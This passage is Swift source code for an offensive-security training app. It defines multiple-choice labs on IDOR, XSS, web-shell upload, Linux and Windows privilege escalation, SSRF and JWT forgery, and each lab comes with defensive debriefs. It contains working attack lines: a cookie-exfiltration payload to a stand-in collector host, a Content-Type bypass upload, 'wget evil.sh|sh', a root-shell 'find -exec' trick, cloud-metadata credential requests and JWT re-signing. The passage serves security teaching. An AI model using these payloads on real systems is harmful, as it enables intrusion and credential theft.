import Foundation

/// Standalone hands-on labs — Red.
/// See `Labs` in LabLibrary.swift for how these are surfaced.
///
/// Twelve standalone offensive labs, ordered foundational → expert. They drill
/// techniques the Red Team track teaches (web, Linux/Windows privesc, Active
/// Directory, post-exploitation) without re-running the four labs that already
/// exist (`lab-nmap-enum`, `lab-sqli-bypass`, `lab-vishing-defense`,
/// `lab-authlog-triage`). Several deliberately make the *quieter, more careful*
/// choice the correct one — scope discipline, lockout awareness, going slow —
/// because that judgment is the professional difference the app exists to teach.
enum LabsRed {
    static let labs: [InteractiveLab] = [

        // MARK: 1 — IDOR / broken access control (foundational)
        InteractiveLab(
            id: "lab-idor-hunt",
            title: "Walk an IDOR to someone else's data",
            goal: "Read another customer's invoice on the practice portal without touching an exploit.",
            track: .redTeam,
            difficulty: .foundational,
            minutes: 6,
            scenario: "You hold a signed web-app engagement scope covering `portal.acme-lab.local` only. You registered a normal account and are logged in as customer **1042**. The app shows *your* invoice at `/api/invoice/1042`. Everything here is the client's own staging copy, seeded with fake records.",
            debrief: "You never sent a payload — you changed a number in a request you were already allowed to make. That is broken access control, OWASP's #1 web risk: the app authenticated you but never *authorized* each object. A defender catches this by logging object access per session and alerting when user 1042 reads 1043's record — and fixes it with a server-side `WHERE id = :id AND owner = :session_user` check, not by hiding the URL.",
            tools: ["browser", "burp"],
            relatedLessonID: "red-access-control",
            steps: [
                LabStep(
                    instruction: "Your own invoice loads at `/api/invoice/1042`. Before anything else, confirm the id is a **direct object reference** you control. What's the first, lowest-impact probe?",
                    hint: "You want to learn whether the id is predictable and whether ownership is checked — with the smallest possible change.",
                    options: [
                        LabOption("GET /api/invoice/1043", correct: true, output: "HTTP/1.1 200 OK\n{ \"id\":1043, \"owner\":\"Dana Okafor\", \"total\":418.00 }", feedback: "One id up, and the server returned a record that isn't yours — no ownership check. That single 200 confirms IDOR with the gentlest possible test."),
                        LabOption("GET /api/invoice/../../etc/passwd", output: "HTTP/1.1 400 Bad Request", feedback: "That's a path-traversal payload, a different bug class. You're testing whether an *id* is authorized, not whether the path parser is broken — start with the simplest change."),
                        LabOption("GET /api/invoice/1042' OR '1'='1", output: "HTTP/1.1 500 Internal Server Error", feedback: "You've jumped to SQL injection. The invoice id is an object reference — probe access control first by simply requesting a neighbouring id.")
                    ]),
                LabStep(
                    instruction: "`1043` returned Dana's invoice. You could now script a loop over every id. Your scope says *demonstrate the issue*, not harvest data. What do you capture for the report?",
                    hint: "Think about what proves the finding versus what needlessly exposes real people's data.",
                    options: [
                        LabOption("Loop ids 1–100000 and download every invoice", output: "downloaded 41,882 records… (PII now on your disk)", feedback: "Mass-exfiltrating real customer data is loud, often out of scope, and makes you the custodian of a breach. One or two proof records demonstrate the flaw — pulling everything is the destructive, indefensible choice."),
                        LabOption("Save your own 1042 plus Dana's 1043 as proof, then stop", correct: true, output: "saved invoice_1042.json, invoice_1043.json — evidence sufficient", feedback: "Two records — one yours, one not — prove you reached another user's object. That is enough to write the finding. Minimizing exposure of real data is scope discipline, and it's exactly what a professional does here."),
                        LabOption("Change Dana's email via POST to prove write access too", output: "HTTP/1.1 200 OK — record modified", feedback: "You just altered a real (staging, but real-shaped) record. Even if write-IDOR exists, modifying someone's data without explicit authorization risks damage. Demonstrate read, note write as a *possible* follow-up to confirm with the client — don't tamper."),
                    ]),
                LabStep(
                    instruction: "Poking around, you spot an undocumented `/api/admin/users` link in a JS bundle. You're a normal user. What's the careful way to test for a *vertical* access-control failure?",
                    hint: "Forced browsing tests whether a higher-privilege endpoint checks your role — do it with the safest verb first.",
                    options: [
                        LabOption("GET /api/admin/users", correct: true, output: "HTTP/1.1 200 OK\n[ {\"id\":1,\"role\":\"admin\"}, ... ]   ← a normal user reached an admin endpoint", feedback: "A plain GET returned admin-only data — a *vertical* access-control failure (privilege escalation), distinct from the horizontal IDOR you already found. Confirming read-only first is the right touch."),
                        LabOption("DELETE /api/admin/users/1", output: "HTTP/1.1 200 OK — user 1 deleted", feedback: "You destroyed a record to 'test' access. Even in staging, deleting data is needless and risky. Confirm the missing check with a read; never lead with a destructive verb."),
                        LabOption("Assume it's fine — the link is hidden from the UI", output: "", feedback: "A link buried in a JS bundle isn't access control; the server must enforce it. Assuming safety because the UI hides the endpoint is exactly the mistake that leaves vertical IDOR open. Test it read-only.")
                    ]),
                LabStep(
                    instruction: "Writing the fix recommendation. The developer offers: 'We'll switch the ids to random UUIDs so they can't be guessed.' Is that the fix?",
                    hint: "Would an unguessable id have stopped you once you saw a real one in a response or log?",
                    options: [
                        LabOption("Yes — unguessable ids close the hole", output: "", feedback: "Randomizing ids is obfuscation, not authorization. UUIDs leak in URLs, referrers, logs and other API responses; once an attacker sees one, the missing ownership check still hands it over. This only raises the bar slightly."),
                        LabOption("No — enforce a server-side ownership check on every object", correct: true, output: "fix: SELECT ... WHERE id=:id AND owner_id=:session_user  →  1043 now returns 403", feedback: "The server must authorize each object against the *session's* identity, every request, deny-by-default. UUIDs can be a defence-in-depth layer, but the actual fix is the ownership check."),
                        LabOption("No — add a WAF rule to block sequential id requests", output: "", feedback: "A WAF guessing at 'suspicious' id patterns will miss real traffic and break legitimate use. Access control belongs in the application against the authenticated identity, not in a pattern-matcher at the edge.")
                    ])
            ]),

        // MARK: 2 — XSS to session theft (foundational)
        InteractiveLab(
            id: "lab-xss-session",
            title: "Turn reflected XSS into a stolen session",
            goal: "Prove a search box runs your JavaScript, then show it can lift a session cookie — on your own lab app.",
            track: .redTeam,
            difficulty: .foundational,
            minutes: 6,
            scenario: "You're testing `shop.lab`, a deliberately vulnerable app you deployed on your own VM. The search page reflects the `q` parameter back into the results heading. Your listener at `collector.lab` is a box you also own, standing in for an attacker's server.",
            debrief: "Reflected XSS runs *your* script in the victim's browser with the site's origin, so it can read anything the page can — including a cookie that lacks `HttpOnly`. The defender's layered answer: context-aware output encoding (the real fix), `HttpOnly` so script can't read the cookie, and a Content-Security-Policy that blocks exfiltration to `collector.lab`. Any one of those would have broken this chain.",
            tools: ["browser", "burp"],
            relatedLessonID: "red-xss",
            steps: [
                LabStep(
                    instruction: "First, find out whether `q` is reflected *unescaped*. What's the cleanest probe that tells you how your input lands in the HTML?",
                    hint: "You want a marker that renders differently if the special characters are escaped versus not.",
                    options: [
                        LabOption("q=hello", output: "<h2>Results for hello</h2>", feedback: "Plain text tells you the value is reflected, but not whether `<` and `>` are escaped. You need a probe with special characters to see if markup survives."),
                        LabOption("q=<b>xss</b>", correct: true, output: "<h2>Results for <b>xss</b></h2>   ← rendered bold, not escaped", feedback: "The tags rendered as HTML rather than showing as text — the app isn't encoding output. If `<b>` executes, so will `<script>`. That's the tell."),
                        LabOption("q='; DROP TABLE products;--", output: "<h2>Results for '; DROP TABLE products;--</h2>", feedback: "That's a SQL payload aimed at the database, and here it was just reflected as text. XSS is about what the *browser* executes — probe with HTML markup instead.")
                    ]),
                LabStep(
                    instruction: "Markup is reflected unescaped. Craft a payload that proves script execution *and* demonstrates the real impact — reading the session cookie — to your own collector.",
                    hint: "A simple `alert(1)` proves execution but not impact. Show what an attacker would actually do, pointed at a box you own.",
                    options: [
                        LabOption("q=<script>alert(1)</script>", output: "popup: 1", feedback: "This proves execution, which is a fine first step — but the finding is far stronger when you demonstrate concrete impact. Escalate to show what the script can actually steal."),
                        LabOption("q=<script>new Image().src='//collector.lab/c?'+document.cookie</script>", correct: true, output: "collector.lab log:  GET /c?session=4f1a9c...  (cookie exfiltrated)", feedback: "The injected script read `document.cookie` and sent it to infrastructure you control — a working session-theft proof. Because the cookie had no `HttpOnly` flag, script could read it."),
                        LabOption("q=<script>document.location='//collector.lab'</script>", output: "victim redirected to collector.lab", feedback: "A redirect proves execution but is noisy and user-visible, and it steals nothing. The impactful, low-visibility demonstration is reading the cookie silently with an image beacon.")
                    ]),
                LabStep(
                    instruction: "You check the response headers and see `Set-Cookie: session=...; Path=/` — no flags. Which control, added here, most directly defeats the step you just did?",
                    hint: "You exfiltrated the cookie by reading `document.cookie` from JavaScript.",
                    options: [
                        LabOption("Set-Cookie: session=...; Secure", output: "", feedback: "`Secure` only forces the cookie over HTTPS — it does nothing to stop same-origin script from reading it. Useful, but not what blocks this read."),
                        LabOption("Set-Cookie: session=...; HttpOnly", correct: true, output: "document.cookie → \"\"   (session cookie no longer script-readable)", feedback: "`HttpOnly` hides the cookie from JavaScript entirely, so `document.cookie` can't see it and the exfil beacon comes back empty. It doesn't fix the XSS — that's output encoding — but it defuses this specific theft."),
                        LabOption("Rotate the session secret key", output: "", feedback: "Rotating the signing key invalidates existing sessions once, but a freshly stolen live cookie is still valid. It doesn't stop script from reading the cookie in the first place.")
                    ]),
                LabStep(
                    instruction: "Last: the single root-cause fix the developer must ship so this payload is inert even without `HttpOnly` or CSP.",
                    hint: "Why did `<b>` and `<script>` render at all?",
                    options: [
                        LabOption("Strip the word 'script' from input", output: "bypassed with <scr<script>ipt>, <img src=x onerror=...>, SVG, event handlers", feedback: "Blacklisting 'script' is trivially bypassed — nested tags, event handlers, SVG and dozens of vectors don't contain it. Filtering the payload is a losing game."),
                        LabOption("Context-aware output encoding of reflected data", correct: true, output: "q=<b>xss</b>  →  <h2>Results for &lt;b&gt;xss&lt;/b&gt;</h2>   (shown as text, never executed)", feedback: "Encoding user data for its HTML context renders `<` as `&lt;`, so input is displayed, never parsed as markup. That's the root-cause fix; HttpOnly and CSP are defence-in-depth on top."),
                        LabOption("Switch the search form from GET to POST", output: "payload still reflects in the POST response body", feedback: "The method changes where the parameter travels, not how it's rendered. Reflected XSS works in POST responses too — the problem is unencoded output, not the verb.")
                    ])
            ]),

        // MARK: 3 — File upload to web shell (intermediate)
        InteractiveLab(
            id: "lab-upload-webshell",
            title: "Slip a web shell past an upload filter",
            goal: "Land executable code via an avatar upload on your lab app and get command execution.",
            track: .redTeam,
            difficulty: .intermediate,
            minutes: 7,
            scenario: "On your own `dvwa`-style lab box, an 'avatar' upload claims to accept images only. The uploads land in a web-served `/uploads/` directory. You want to prove that a weak filter turns storage into remote code execution — on a target you fully own.",
            debrief: "The flaw was trusting attacker-controlled metadata (the `Content-Type` header and extension) instead of the file's real nature and, fatally, serving uploads from a directory that executes scripts. A defender stops this by validating server-side, renaming to a random name with a forced-safe extension, and serving uploads from a separate, non-executing location (or object storage) — so even a planted `.php` is just an inert download.",
            tools: ["curl", "burp"],
            relatedLessonID: "red-file-upload",
            steps: [
                LabStep(
                    instruction: "You upload `shell.php` as-is first, to learn what the filter rejects. What does that tell you?",
                    hint: "A rejection message is reconnaissance — read *what* it objected to.",
                    options: [
                        LabOption("Upload shell.php directly", correct: true, output: "HTTP/1.1 403\n{ \"error\":\"Content-Type image/* required\" }", feedback: "The error names the check: it's inspecting the `Content-Type` header, not the bytes. That's attacker-controlled, so you already see the bypass."),
                        LabOption("Give up — .php is blocked", output: "", feedback: "You only tried the most obvious form. The rejection message is a gift — it tells you exactly which weak check to bypass. Never stop at the first 403."),
                        LabOption("Brute-force the upload endpoint with 10k filenames", output: "423 Locked — endpoint throttled", feedback: "Blind brute force is loud and pointless here. The error already revealed the filter inspects Content-Type; bypass that specifically rather than hammering the endpoint.")
                    ]),
                LabStep(
                    instruction: "The filter trusts the `Content-Type` header. Re-send the PHP shell but declare it an image. How?",
                    hint: "`curl -F` lets you set the part's type independently of the actual bytes.",
                    options: [
                        LabOption("curl -F 'file=@shell.php;type=image/png' https://app.lab/avatar", correct: true, output: "{ \"ok\":true, \"path\":\"/uploads/av_9d2.php\" }", feedback: "You set `type=image/png` on PHP bytes — the header-only check passed and the file landed with its `.php` extension intact in a web-served folder. Now reach it."),
                        LabOption("Rename the file to shell.png and upload", output: "{ \"ok\":true, \"path\":\"/uploads/shell.png\" }", feedback: "Uploaded, but as a `.png` the server treats it as a static image and won't execute the PHP — you get no code execution. You need the Content-Type to pass *and* an executable extension to remain."),
                        LabOption("Base64-encode the shell into the filename", output: "400 Bad Request — filename too long", feedback: "The filename isn't where code executes, and most stacks cap its length. The bypass is faking the Content-Type while keeping a runnable extension, not encoding tricks in the name.")
                    ]),
                LabStep(
                    instruction: "It saved to `/uploads/av_9d2.php`. Confirm code execution with the least intrusive command.",
                    hint: "Prove you can run a command — don't start changing the system.",
                    options: [
                        LabOption("curl 'https://app.lab/uploads/av_9d2.php?c=id'", correct: true, output: "uid=33(www-data) gid=33(www-data) groups=33(www-data)", feedback: "`id` runs as the web user and returns cleanly — code execution proven, nothing altered. `id`/`whoami` are the standard harmless proof-of-execution."),
                        LabOption("curl 'https://app.lab/uploads/av_9d2.php?c=rm+-rf+/'", output: "(destructive — do not run)", feedback: "Never run a destructive command to 'prove' access. You'd wreck the target and demonstrate nothing a harmless `id` doesn't. This is the loud, damaging choice an operator refuses."),
                        LabOption("curl 'https://app.lab/uploads/av_9d2.php?c=wget+evil.sh|sh'", output: "(pulls and runs external code)", feedback: "Pulling and running an external stage to confirm a shell is overkill and risky for a proof step. Confirm execution with `id` first; stage further tooling only when the engagement calls for it.")
                    ]),
                LabStep(
                    instruction: "Report time. Which single server-side change best prevents this class of upload-to-RCE?",
                    hint: "Two things combined let you win: a bypassable check, and uploads running as code.",
                    options: [
                        LabOption("Add .php5, .phtml, .phar to the extension blocklist", output: "bypassed via .pht, trailing dot, case, double extension", feedback: "Extension blocklists leak endlessly — new executable extensions, trailing dots, case tricks, double extensions. You can't enumerate every dangerous name."),
                        LabOption("Store uploads outside the web root (or in object storage) and serve them inert", correct: true, output: "fix: uploads/ served with no script handler + random name  →  av_9d2.php downloads as bytes, never executes", feedback: "If the upload directory can't execute scripts, a planted `.php` is just an inert file. Pair with server-side content validation and forced-safe random names. This removes the 'storage becomes execution' root cause."),
                        LabOption("Check the file's magic bytes for GIF89a", output: "bypassed with a GIF89a; prefix on a polyglot PHP file", feedback: "A magic-byte check alone is defeated by polyglots — a file that is a valid image header *and* valid PHP. Content checks help, but without a non-executing upload location they don't stop RCE.")
                    ])
            ]),

        // MARK: 4 — Linux privesc via SUID / GTFOBins (intermediate)
        InteractiveLab(
            id: "lab-linux-suid",
            title: "Root a Linux box with a SUID GTFOBin",
            goal: "Escalate from a www-data shell to root on your lab VM by abusing a misconfigured binary.",
            track: .redTeam,
            difficulty: .intermediate,
            minutes: 7,
            scenario: "You have a low-privilege `www-data` shell on a Linux VM in your home lab after a web foothold. No kernel exploits needed — the admin left a misconfiguration. Enumerate, identify it, and escalate the quiet way.",
            debrief: "Privesc on Linux is a search problem, not an exploit: you *found* a binary running with root's identity and used its intended feature (`-exec`) against the system. The defender's view — the fix was never 'patch find'; it's removing the SUID bit and the unnecessary `sudo` grant, and alerting on `uid=0` shells spawned by service accounts. GTFOBins is as much a hardening checklist as an attack catalogue.",
            tools: ["bash", "GTFOBins"],
            relatedLessonID: "red-linux-privesc",
            steps: [
                LabStep(
                    instruction: "You just landed the shell. What's the highest-yield first enumeration, before reaching for any exploit?",
                    hint: "Two cheap questions win most Linux boxes: what can I run as root, and what runs as root that I can touch?",
                    options: [
                        LabOption("sudo -l; find / -perm -4000 -type f 2>/dev/null", correct: true, output: "User www-data may run:\n    (root) NOPASSWD: /usr/bin/find\n/usr/bin/find\n/usr/bin/passwd\n/bin/mount", feedback: "`sudo -l` shows `find` is runnable as root with NOPASSWD, and the SUID sweep confirms it. `find` is a classic GTFOBin — you have your vector without touching the kernel."),
                        LabOption("uname -a and search for a kernel exploit", output: "Linux 5.15.0-91-generic", feedback: "Kernel exploits are the fragile last resort — they can crash the box and are often patched. Always enumerate the cheap misconfigs (sudo, SUID, cron, caps) first; here they'd have handed you root immediately."),
                        LabOption("Run a loud full-system brute of every password", output: "john: 0 cracked (and very noisy)", feedback: "Cracking local passwords is slow, noisy and usually unnecessary. Check `sudo -l` and SUID binaries first — misconfiguration beats brute force almost every time.")
                    ]),
                LabStep(
                    instruction: "`find` is runnable as root (sudo NOPASSWD) and is SUID. How do you turn that into a root shell?",
                    hint: "`find`'s `-exec` runs an arbitrary command — and when `find` runs as root, so does that command.",
                    options: [
                        LabOption("sudo find . -exec /bin/sh \\; -quit", correct: true, output: "# id\nuid=0(root) gid=0(root) groups=0(root)", feedback: "`-exec` launches `/bin/sh`; because `find` runs as root via sudo, the shell inherits uid 0. `-quit` stops after the first match so you drop straight into the root shell. This is the GTFOBins `find` technique."),
                        LabOption("sudo find / -name flag.txt", output: "/root/flag.txt", feedback: "You used root's privilege merely to *locate* a file — you can read it, but you didn't get a shell or a durable foothold. Use `-exec` to actually execute as root."),
                        LabOption("chmod u+s /bin/bash", output: "chmod: changing permissions of '/bin/bash': Operation not permitted", feedback: "You're still www-data, so you can't set the SUID bit on bash — that requires root, which is what you're trying to get. Use the privilege you already have via sudo-find's `-exec`.")
                    ]),
                LabStep(
                    instruction: "You have a root shell. For the report, what's the right, minimal evidence to capture — without overstepping?",
                    hint: "Prove root cleanly; resist turning a privesc proof into a data-harvesting spree.",
                    options: [
                        LabOption("Capture `id`, hostname, and the single scoped proof file", correct: true, output: "# id && hostname && cat /root/proof.txt\nuid=0(root) gid=0(root) groups=0(root)\nweb01\nPROOF-9f2a1c", feedback: "`id` as uid 0, the hostname, and the one agreed proof file are clean, sufficient evidence of root — minimal and defensible. Exactly what the report needs."),
                        LabOption("Dump /etc/shadow and crack every user's password", output: "unshadowed 40 hashes → john running… (far beyond proving root)", feedback: "You already proved root — cracking every account is overreach that exposes real credentials for no added value to the finding. Restraint after the win is part of the job."),
                        LabOption("Install a persistent SUID backdoor for later", output: "cp /bin/bash /tmp/.r; chmod +s /tmp/.r   (out of scope, alters the system)", feedback: "Planting a backdoor modifies the host and is almost never in scope for a privesc proof. Capture evidence and stop — don't leave artifacts behind.")
                    ]),
                LabStep(
                    instruction: "You're root. For the report, what's the precise, minimal fix for this specific finding?",
                    hint: "What exactly made `find` dangerous here? Fix *that*, not Linux in general.",
                    options: [
                        LabOption("Remove the NOPASSWD sudo grant for find and strip any unnecessary SUID bit", correct: true, output: "fix: removed 'www-data ... NOPASSWD: /usr/bin/find'; find no longer runs as root  →  escalation closed", feedback: "The root cause was a service account allowed to run a shell-spawning binary as root. Removing that grant (and any needless SUID bit) closes it without breaking the system. Precise, minimal, correct."),
                        LabOption("Delete /usr/bin/find from the system", output: "many scripts and cron jobs now fail", feedback: "`find` is a core utility — removing it breaks legitimate tooling across the box. The problem isn't `find` existing; it's `find` being runnable *as root* by a low-priv account. Fix the grant, not the binary."),
                        LabOption("Change www-data's password to something strong", output: "", feedback: "The escalation didn't use a password — it used a NOPASSWD sudo rule. A stronger www-data password changes nothing about the `sudo find` path. Address the sudoers entry.")
                    ])
            ]),

        // MARK: 5 — SSRF to cloud metadata (intermediate)
        InteractiveLab(
            id: "lab-ssrf-metadata",
            title: "Pivot an SSRF into cloud credentials",
            goal: "Use a URL-fetch feature on your lab app to reach the instance metadata service and surface IAM creds.",
            track: .redTeam,
            difficulty: .intermediate,
            minutes: 7,
            scenario: "Your lab app `shop.lab` has a 'fetch product image by URL' feature, running on a cloud VM you provisioned for testing. The VM has an IAM role attached. You suspect the fetcher doesn't restrict destinations. Everything is in your own cloud account.",
            debrief: "SSRF made the server a confused deputy: it has network reach you don't — to `169.254.169.254` — and you borrowed it. In the cloud this routinely escalates to full account compromise. The defenders' real controls: enforce IMDSv2 (a GET-only SSRF can't do the token PUT), block link-local/RFC1918 egress, and allowlist the few destinations the feature legitimately needs. Blocklists of 'bad' strings don't hold.",
            tools: ["curl", "burp"],
            relatedLessonID: "red-ssrf",
            steps: [
                LabStep(
                    instruction: "First confirm the fetcher will request an *internal* address, not just public image URLs. What's the safest confirmation probe?",
                    hint: "You want proof it reaches something only the server can — without hitting anything sensitive yet.",
                    options: [
                        LabOption("url=http://127.0.0.1:80/", correct: true, output: "fetched: <title>shop.lab internal — it works</title>", feedback: "The server fetched its own localhost — a destination you can't reach from outside. That confirms SSRF reaches internal addresses, using the most benign internal target first."),
                        LabOption("url=http://169.254.169.254/latest/meta-data/iam/security-credentials/", output: "web-app-role", feedback: "That works, but you jumped straight to the crown jewels before confirming the basic capability. Confirm internal reach with a harmless target like localhost first — it's cleaner and avoids pulling secrets before you've scoped the finding."),
                        LabOption("url=file:///etc/passwd", output: "root:x:0:0:root:/root:/bin/bash...", feedback: "That may work via the `file://` scheme and is a valid finding, but you've gone straight to reading host files. Establish that the HTTP fetcher reaches internal addresses first — it's the core of the SSRF and the least intrusive proof.")
                    ]),
                LabStep(
                    instruction: "Internal reach confirmed. Now demonstrate cloud impact: enumerate the IAM role exposed by the metadata service.",
                    hint: "The classic metadata base is `http://169.254.169.254/latest/meta-data/`. Start by listing the role name.",
                    options: [
                        LabOption("url=http://169.254.169.254/latest/meta-data/iam/security-credentials/", correct: true, output: "web-app-role", feedback: "The metadata service returned the role name attached to the VM. The next path segment — `.../web-app-role` — would return the temporary AccessKeyId, SecretAccessKey and Token. That's the SSRF-to-cloud-creds pivot. Note a bare GET like this only works against **IMDSv1**: with IMDSv2 enforced you must first PUT for a token and send it back in `X-aws-ec2-metadata-token`, which a simple SSRF usually cannot do — which is exactly why enforcing it is the fix."),
                        LabOption("url=http://169.254.169.254/latest/user-data/", output: "#!/bin/bash\n# (cloud-init script, sometimes has secrets)", feedback: "User-data can leak secrets and is worth noting, but it's not guaranteed and isn't the direct credential path. The IAM security-credentials endpoint is the reliable, high-impact target."),
                        LabOption("url=http://169.254.169.254/", output: "1.0\n2007-01-19\n...\nlatest", feedback: "That just lists API versions — true, but it doesn't demonstrate impact. Walk to the IAM security-credentials path to surface the role whose keys matter.")
                    ]),
                LabStep(
                    instruction: "The role is `web-app-role`. Retrieve the credentials to demonstrate impact — then stop. What's the exact move, and where do you draw the line?",
                    hint: "One more path segment returns the keys. Holding them is the finding; using them against resources is a separate, scoped decision.",
                    options: [
                        LabOption("GET .../iam/security-credentials/web-app-role, capture the keys as proof, stop", correct: true, output: "{ \"AccessKeyId\":\"ASIA...\", \"SecretAccessKey\":\"wJal...\", \"Token\":\"IQoJ...\", \"Expiration\":\"...\" }   ← evidence captured", feedback: "The temporary keys returned — a complete, critical SSRF-to-cloud-credentials proof. Capturing them demonstrates the finding; whether to exercise them against resources is a separate, explicitly-scoped step."),
                        LabOption("Use the keys to delete an S3 bucket to prove they work", output: "(destructive — would delete real data)", feedback: "Destroying a resource to 'prove' the keys is reckless and out of scope. Holding valid credentials is itself the finding; never cause damage to demonstrate it."),
                        LabOption("Stop at the role name — pulling the keys is too risky", output: "", feedback: "Reading the temporary credentials is the standard, non-destructive proof for this finding. Stopping at the role name under-demonstrates a critical issue — capture the keys, then stop there.")
                    ]),
                LabStep(
                    instruction: "You write the remediation. The team's first idea: 'Block requests containing 169.254.169.254.' Good enough?",
                    hint: "How many ways can you write that one IP address?",
                    options: [
                        LabOption("No — enforce IMDSv2 and block link-local egress; allowlist destinations", correct: true, output: "fix: IMDSv2 required (GET-only SSRF can't PUT a token) + egress deny to 169.254.0.0/16 & RFC1918 + destination allowlist", feedback: "IMDSv2's token PUT defeats a plain GET SSRF, egress rules stop the server reaching link-local/internal ranges at all, and an allowlist limits the fetcher to what it actually needs. That's the layered fix that holds."),
                        LabOption("Yes — a string blocklist on that IP stops it", output: "bypassed: http://2852039166/, http://0x A9FEA9FE/, http://[::ffff:169.254.169.254]/, DNS rebinding", feedback: "That single address has decimal, hex, IPv6-mapped and DNS-rebinding representations. String blocklists are bypassed endlessly — this is why allowlisting destinations beats denylisting 'bad' ones."),
                        LabOption("Disable the image-fetch feature entirely", output: "feature removed — but the pattern recurs on the next URL-fetcher", feedback: "Killing the feature closes this instance but teaches nothing and doesn't protect the next webhook/PDF/import feature. The durable answer is IMDSv2 plus egress and allowlist controls that apply everywhere.")
                    ])
            ]),

        // MARK: 6 — JWT forgery (advanced)
        InteractiveLab(
            id: "lab-jwt-forge",
            title: "Forge an admin JWT",
            goal: "Promote yourself to admin by defeating a JWT's signature check on your lab API.",
            track: .redTeam,
            difficulty: .advanced,
            minutes: 7,
            scenario: "Your lab API issues a JWT on login. You're authenticated as a normal user and hold your token. The header shows `alg:HS256`. You want to reach `/admin`, which requires `role:admin`. The API is one you deployed to study token attacks.",
            debrief: "Every JWT attack makes the server accept a token it should have rejected. Here the signing secret was weak enough to recover offline, after which you could mint any claims you liked — 'decode' was never 'verify' for you, and the server's verify step trusted a key you now held. Defenders pin the algorithm, use a long random secret (or proper asymmetric keys), validate `exp`/`aud`/`iss`, and keep tokens short-lived with revocation.",
            tools: ["jwt_tool", "hashcat"],
            relatedLessonID: "red-jwt",
            steps: [
                LabStep(
                    instruction: "Decode your token to see what you're working with. What does reading the payload tell you?",
                    hint: "The three dot-separated parts are base64url — two of them aren't encrypted at all.",
                    options: [
                        LabOption("echo $JWT | cut -d. -f2 | base64 -d", correct: true, output: "{\"user\":\"alice\",\"role\":\"user\",\"exp\":1780000000}", feedback: "The payload decodes in the clear — `role:user` is right there. It's base64url, not encryption. The only thing stopping you changing it to `admin` is the signature, so that's the target."),
                        LabOption("hashcat -m 0 $JWT rockyou.txt", output: "No hashes loaded (wrong mode/format)", feedback: "Mode 0 is raw MD5; a whole JWT isn't an MD5 hash. Before cracking anything, decode the token to understand the algorithm and claims — then pick the right attack."),
                        LabOption("openssl rsautl -decrypt -in token", output: "unable to load Private Key", feedback: "The token isn't RSA-encrypted — JWT payloads are only base64url-encoded, and this one is HS256 (symmetric) anyway. Just base64-decode it to read the claims.")
                    ]),
                LabStep(
                    instruction: "It's HS256 — signed with a shared secret. You can't edit claims without re-signing. What's the realistic path to the secret for a lab-grade key?",
                    hint: "HMAC secrets can be attacked offline at GPU speed, exactly like a password hash.",
                    options: [
                        LabOption("hashcat -m 16500 token.jwt rockyou.txt", correct: true, output: "eyJhbG...<token>:Secret123\nSession.......: Cracked", feedback: "Mode 16500 is JWT. The signature is an HMAC over header+payload, so a weak secret falls to an offline wordlist — here it's `Secret123`. Now you can sign your own tokens."),
                        LabOption("Set the header to alg:none and strip the signature", output: "401 Unauthorized — algorithm 'none' rejected", feedback: "A good try — `alg:none` wins against libraries that honour unsigned tokens, but this server pins/rejects it. When `none` is blocked, recovering a weak HMAC secret is the next move."),
                        LabOption("Brute-force the /login endpoint for the admin password", output: "429 Too Many Requests — throttled", feedback: "Attacking the login is loud, throttled, and sidesteps the actual weakness. The token's own signature is crackable offline with no noise against the server — do that instead."),
                    ]),
                LabStep(
                    instruction: "You have the secret `Secret123`. Forge a token that makes you admin.",
                    hint: "Re-sign a payload with `role` changed, using the recovered key.",
                    options: [
                        LabOption("jwt_tool $JWT -I -pc role -pv admin -S hs256 -p 'Secret123'", correct: true, output: "[+] New signed token:\neyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoiYWRtaW4i...\n→ GET /admin  200 OK  Welcome, administrator", feedback: "`-I` puts jwt_tool in inject mode, `-pc`/`-pv` set the claim `role` to `admin`, and `-S hs256 -p` re-signs with the recovered secret — so the server's signature check passes. Without `-I` the claim flags are ignored and you just re-sign the original payload. `/admin` now returns 200: a fully valid forged token."),
                        LabOption("Edit role to admin in the payload and resend unchanged", output: "401 Unauthorized — signature mismatch", feedback: "Editing the payload invalidates the signature, which the server verifies. You must *re-sign* with the recovered secret — editing alone fails against a server that actually checks."),
                        LabOption("Append &role=admin to the request URL", output: "403 Forbidden — role taken from token", feedback: "The server reads the role from the signed token, not a query parameter. You have to change the claim inside the token and re-sign it, not tack a parameter on the request.")
                    ]),
                LabStep(
                    instruction: "Remediation. What actually closes this, given the weakness was a guessable HMAC secret?",
                    hint: "Two things let you win: a weak secret, and nothing else to stop a re-signed token.",
                    options: [
                        LabOption("Use a long random secret (or asymmetric keys), pin the algorithm, validate exp/aud/iss", correct: true, output: "fix: 256-bit random HMAC secret + alg pinned to HS256 + short exp  →  offline crack infeasible, none/confusion blocked", feedback: "A high-entropy secret makes offline cracking infeasible, algorithm pinning blocks `none` and RS256→HS256 confusion, and validating standard claims limits a stolen token's reach. That's the complete answer."),
                        LabOption("Base64-encode the whole token twice before sending", output: "server base64-decodes once; attack unchanged", feedback: "Extra encoding is cosmetic — it changes transport, not verification. The forged, correctly-signed token still validates. This fixes nothing."),
                        LabOption("Store the JWT in localStorage instead of a cookie", output: "", feedback: "Storage location is an XSS/exfil consideration, not a signature one. A token forged with the real secret is valid wherever it's stored. The fix is the key strength and verification policy.")
                    ])
            ]),

        // MARK: 7 — Windows token impersonation (advanced)
        InteractiveLab(
            id: "lab-win-token",
            title: "Service account to SYSTEM via SeImpersonate",
            goal: "Escalate from a web-service shell to NT AUTHORITY\\SYSTEM on your Windows lab host.",
            track: .redTeam,
            difficulty: .advanced,
            minutes: 7,
            scenario: "You have a shell as the IIS application-pool account on a Windows Server VM in your lab after a web exploit. You want SYSTEM. On Windows the crown is `NT AUTHORITY\\SYSTEM`, and service accounts often hold a privilege that leads straight there.",
            debrief: "Service accounts like IIS and MSSQL commonly hold `SeImpersonatePrivilege`; the 'Potato' family coerces a SYSTEM-level service to authenticate, then impersonates its token — turning a confined service account into SYSTEM. It's one of the most common real-world Windows escalations. Defenders remove the privilege where it isn't needed, keep services least-privileged, and alert on a service account spawning `cmd`/`powershell` as SYSTEM via a named-pipe impersonation.",
            tools: ["PrintSpoofer", "whoami"],
            relatedLessonID: "red-windows-privesc",
            steps: [
                LabStep(
                    instruction: "Before downloading any tool, check what privileges this account already holds. What do you run?",
                    hint: "One command lists your token privileges — the escalation path is often sitting enabled in it.",
                    options: [
                        LabOption("whoami /priv", correct: true, output: "SeImpersonatePrivilege    Impersonate a client after authentication    Enabled", feedback: "`SeImpersonatePrivilege` is enabled — the hallmark of IIS/MSSQL accounts and exactly what the Potato family needs. You've found your path without downloading anything yet."),
